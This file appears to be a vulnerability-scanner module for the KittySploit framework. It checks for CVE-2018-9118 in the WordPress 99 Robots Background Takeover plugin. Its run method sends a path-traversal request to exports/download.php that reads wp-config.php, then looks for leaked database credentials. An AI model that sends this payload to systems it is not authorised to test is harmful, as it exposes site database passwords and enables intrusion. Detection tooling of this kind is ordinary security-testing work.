#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress 99 Robots WP Background Takeover Advertisements 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress 99 Robots WP Background Takeover Advertisements <=4.1.4 - Local File Inclusion Detection',
        'description': 'WordPress 99 Robots WP Background Takeover Advertisements 4.1.4 is susceptible to local file inclusion via exports/download.php.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'edb', 'wordpress', 'wp-plugin', 'lfi', 'traversal', 'wp', '99robots', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/44417',
            'https://wpvulndb.com/vulnerabilities/9056',
            'https://99robots.com/docs/wp-background-takeover-advertisements/',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-9118',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2018-9118',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/wpsite-background-takeover/exports/download.php?filename=../../../../wp-config.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD', 'DB_HOST', 'The base configurations of the WordPress',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="WordPress 99 Robots WP Background Takeover Advertisements <=4.1.4 - Local File Inclusion detected",
                path='/wp-content/plugins/wpsite-background-takeover/exports/download.php?filename=../../../../wp-config.php',
            )
            return True
        return False

